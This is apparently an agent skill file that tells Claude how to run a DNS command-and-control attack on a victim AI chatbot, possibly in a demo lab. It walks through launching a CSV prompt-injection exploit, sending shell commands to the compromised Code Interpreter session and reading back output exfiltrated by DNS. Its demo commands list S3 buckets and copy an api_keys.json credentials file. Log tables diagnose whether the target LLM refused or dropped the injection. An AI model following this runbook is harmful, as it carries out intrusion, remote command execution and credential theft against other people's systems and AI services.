---
name: c2-operate
description: Operate and debug the DNS C2 system non-interactively. This skill should be used when Claude needs to launch an exploit, send commands to a compromised session and collect output, diagnose why a payload is not calling home, or inspect C2 server state. Triggers on requests like "run the exploit", "send whoami to the session", "why isn't the payload calling back", "check what sessions are active", or "debug the C2".
---

# C2 Operate — Non-Interactive C2 Automation & Debugging

Operate the DNS C2 system without interactive prompts. Claude cannot use
`c2 attach` (it requires a TTY). Instead, use `c2 send` + `c2 receive`
in a loop, and `c2 sessions` / `c2 debug` for diagnostics.

## Important: Working Directory

All `uv run c2 ...` commands MUST run from the `attacker-infra/` directory.
The `.env` file there provides `EC2_IP`, `DOMAIN`, etc.

## Workflow 1: Launch Exploit

Fire a malicious CSV at the victim chatbot and get a session ID.

```bash
cd attacker-infra

# Option A: auto-read victim URL from ../.victim_url
uv run c2 exploit

# Option B: explicit target
uv run c2 exploit https://<victim-alb-url>
```

The command prints a session ID like `sess_a1b2c3d4` and saves it to
`attacker-infra/.session_id`. Capture this ID for subsequent commands.

After launching, wait ~20-30 seconds for the Code Interpreter sandbox to
boot and the payload to start polling.

## Workflow 2: Send Command & Collect Output (Non-Interactive)

**This is the primary loop Claude should use.** Never use `c2 attach`.

```bash
cd attacker-infra

# Step 1: Send a command
uv run c2 send "whoami" -s sess_a1b2c3d4

# Step 2: Wait for output (polls every 2s, up to 45s)
uv run c2 receive -s sess_a1b2c3d4 --wait 45 --poll-interval 2
```

### Critical: Tracking Output IDs with --since

Each output has an incrementing ID. By default `receive` returns ALL outputs
starting from ID 0. When sending multiple commands, use `--since` to skip
outputs already seen:

```bash
# First command
uv run c2 send "whoami" -s $SID
uv run c2 receive -s $SID --wait 45
# Output shows: [Output 1] ... -> next --since value is 1

# Second command
uv run c2 send "cat /etc/os-release" -s $SID
uv run c2 receive -s $SID --since 1 --wait 45
# Output shows: [Output 2] ... -> next --since value is 2
```

Parse the `[Output N]` line to track the last seen ID. Increment `--since`
after each successful receive.

### Looping Multiple Commands

Execute send+receive pairs sequentially. Wait for each receive to complete
before sending the next command — the C2 protocol is single-command-at-a-time
per session.

```bash
cd attacker-infra
SINCE=0
for cmd in "whoami" "cat /etc/os-release" "env | head -20"; do
    uv run c2 send "$cmd" -s "$SESSION_ID"
    uv run c2 receive -s "$SESSION_ID" --since $SINCE --wait 45 --poll-interval 2
    SINCE=$((SINCE + 1))
done
```

## Workflow 3: Diagnose Problems

### Quick Check: Is anything alive?

```bash
cd attacker-infra

# Check C2 server reachability
uv run c2 status

# List active sessions (shows last-seen time, pending commands)
uv run c2 sessions
```

### Deep Diagnosis: Full Debug Dump

```bash
cd attacker-infra
uv run c2 debug
```

This returns:
- **Server uptime** — has the server restarted recently?
- **Active sessions** — which sessions exist, when they last polled, pending
  command count, poll count
- **Recent DNS queries** — last 50 queries with timestamps, source IPs, and
  query names
- **Output buffer** — per-session chunk counts for in-progress exfiltration

### Diagnosis Decision Tree

When `c2 receive` returns "No output available" after waiting:

1. **Run `uv run c2 sessions`** — does the session ID appear?
   - **No** → Payload never called home. Check:
     - Was the exploit sent? (`uv run c2 exploit` output)
     - Is the victim chatbot accessible?
     - Did the prompt injection trigger? (check victim chatbot response)
   - **Yes** → Payload is polling. Continue to step 2.

2. **Run `uv run c2 debug`** — check recent DNS queries for the session ID.
   - **Only `cmd.*` queries** → Command was never delivered. The command may
     have been consumed by a previous send, or there is a queue issue. Re-send
     the command.
   - **`cmd.*` + `c0.*`, `c1.*` queries** → Command WAS delivered. The payload
     received it. Check:
     - Is the command slow? (e.g., large S3 listing)
     - Did the exfiltration DNS queries fail? Look for data exfil queries in
       the debug output.
   - **No queries at all for this session** → Session ID mismatch. Check
     `.session_id` file matches what you're using.

3. **Check session state details in debug output:**
   - `has_pending_delivery: true` → Command is staged but client hasn't fetched
     chunks yet. The payload may have crashed or DNS responses aren't reaching it.
   - `pending_commands > 0` → Commands are queued but not yet staged. The
     client hasn't polled recently enough to pick them up.
   - `output_chunks > 0` → Exfiltration is in progress but incomplete. Some
     chunks arrived but not all. Wait longer or check for DNS packet loss.

## Workflow 4: Victim-Side Debugging (requires target account access)

If you have access to the victim's AWS account, you can inspect what the
Code Interpreter is doing from its side. This is invaluable when the C2
channel goes quiet.

### Session ID Correlation

The chatbot names each Code Interpreter session `session-{c2_session_id}`.
This means our C2 session ID (e.g., `sess_4c2ab658`) maps directly to the
Code Interpreter session name `session-sess_4c2ab658`.

### List Code Interpreter Sessions

```bash
# Get the Code Interpreter ID from victim-infra Terraform
CI_ID=$(cd victim-infra/terraform && terraform output -raw code_interpreter_id)

# List recent sessions (READY = active, TERMINATED = done)
aws bedrock-agentcore list-code-interpreter-sessions \
    --code-interpreter-identifier "$CI_ID" \
    --region us-east-1 --max-results 10

# List only active sessions
aws bedrock-agentcore list-code-interpreter-sessions \
    --code-interpreter-identifier "$CI_ID" \
    --status READY --region us-east-1

# Get details for a specific session
aws bedrock-agentcore get-code-interpreter-session \
    --code-interpreter-identifier "$CI_ID" \
    --session-id "01KKS75W5639DZTE4QAWY92YZ5" \
    --region us-east-1
```

The `name` field in the output contains the C2 session ID (e.g.,
`"name": "session-sess_4c2ab658"`), so you can find the AWS session ID
that corresponds to your C2 session.

### ECS Application Logs

The victim's FastAPI chatbot logs to CloudWatch at `/ecs/victim-chatbot`.
These show the full lifecycle: CSV receipt, Code Interpreter session ID,
every code execution iteration, and execution output (including errors).

```bash
# Tail recent logs (filter out health checks)
aws logs tail /ecs/victim-chatbot --region us-east-1 --since 30m --format short \
    | grep -v "/health"

# Get the full story for a specific C2 session
aws logs filter-log-events \
    --log-group-name /ecs/victim-chatbot \
    --region us-east-1 \
    --filter-pattern "sess_4c2ab658" \
    --start-time $(date -v-1H +%s000) \
    --query 'events[].message' --output text

# Get just the app-level events (no HTTP access logs)
aws logs tail /ecs/victim-chatbot --region us-east-1 --since 1h --format short \
    | grep -v "/health" \
    | grep -E "(analyze|agentcore|LLM|Code|iteration|output|Error|session)"
```

### Reading the ECS Logs: What Each Pattern Means

The logs tell the complete story of what happened inside the Code Interpreter.

**CSV received and session started:**
```
app.routers.analyze - INFO - CSV analysis request received
  File: customer_analysis.csv
  Size: 2588 bytes
app.services.agentcore - INFO - Starting CSV analysis for session sess_4c2ab658
app.services.agentcore - INFO - Code Interpreter session: 01KKS75W5639DZTE4QAWY92YZ5
```

**Payload executing successfully** — no error output between iterations,
the LLM keeps re-running the injection every ~15s across all 15 iterations.
The payload runs silently while DNS-exfiltrating data:
```
LLM executing code (iteration 1): import pandas as pd
<payload code visible in log>
LLM executing code (iteration 2): import pandas as pd
<payload code visible, no error between>
...through iteration 15...
Background analysis complete for session sess_4c2ab658
```

**Payload failed — double-quote CSV quoting bug:**
```
Code execution output (3727 chars): Cell In[2], line 3
SyntaxError: invalid syntax
```
Look for doubled double-quotes (`""value""`) in the logged code.
See `docs/CSV_QUOTING_FIX.md`.

**Payload failed — LLM mangled the code:**
```
Code execution output: Traceback (most recent call last)...
IndentationError: unindent does not match any outer indentation level
```

**LLM gave up on injection, just analyzed the CSV:**
```
Code execution output (260 chars): Customer ID  Name  Revenue
```

### Diagnosis Table

| Log pattern | What happened |
|---|---|
| No "CSV analysis request received" | CSV never reached the chatbot |
| "Starting CSV analysis" but no "LLM executing code" | LLM refused injection entirely |
| Payload code visible with no error output | Payload ran successfully. Check C2 for DNS queries. |
| SyntaxError with doubled quotes in code | Double-quote CSV escaping bug |
| Traceback / IndentationError / SyntaxError | LLM mangled code. May retry and succeed later. |
| Normal CSV output (Customer ID, Name, Revenue) | LLM gave up on injection, analyzed data instead |
| 15 iterations all with payload code | Full success — payload ran for entire session |
| Iterations stop mid-session | Code Interpreter session timed out (5min) |

### Code Interpreter CloudWatch Logging (Console Only)

Native CloudWatch logging on the Code Interpreter resource itself can be
enabled via the AWS Console (not yet supported in Terraform):

1. Go to **Amazon Bedrock > AgentCore > Code Interpreters**
2. Select the interpreter (e.g., `victim_chatbot_558b81a5`)
3. Enable **CloudWatch Logging** and select/create a log group
   (e.g., `/aws/bedrock-agentcore/code-interpreter`)
4. Save

Once enabled, query with:

```bash
LOG_GROUP="/aws/bedrock-agentcore/code-interpreter"
aws logs tail "$LOG_GROUP" --region us-east-1 --since 30m --format short
```

Note: The ECS logs already capture code execution and output. The native
Code Interpreter logs may provide additional execution metadata (sandbox
stdout/stderr, resource usage) that the chatbot doesn't surface.

## Workflow 5: Generate CSV Without Sending

For manual upload scenarios:

```bash
cd attacker-infra
uv run c2 generate-csv
```

Produces `attacker-infra/malicious_data.csv` and prints the session ID.

## CLI Quick Reference

All from `attacker-infra/`:

| Command | Purpose |
|---------|---------|
| `uv run c2 exploit [URL]` | Generate + send payload to victim |
| `uv run c2 send "CMD" -s ID` | Queue a command for a session |
| `uv run c2 receive -s ID --since N --wait 45` | Poll for command output (skip first N) |
| `uv run c2 sessions` | List sessions with status |
| `uv run c2 debug` | Full diagnostic dump |
| `uv run c2 status` | Check C2 server connectivity |
| `uv run c2 generate-csv` | Generate malicious CSV only |

## Common Demo Commands

After getting a session, run these to demonstrate impact:

```
whoami
cat /etc/os-release
aws sts get-caller-identity
aws s3 ls
aws s3 ls s3://victim-chatbot-sensitive-* --recursive
aws s3 cp s3://victim-chatbot-sensitive-*/credentials/api_keys.json -
aws dynamodb list-tables
env | head -20
```

## Makefile Shortcuts

From `attacker-infra/`:

```bash
make exploit                    # Launch exploit
make sessions                   # List sessions
make debug                      # Debug dump
make send CMD="whoami" SESSION=sess_xxx
make receive SESSION=sess_xxx
```
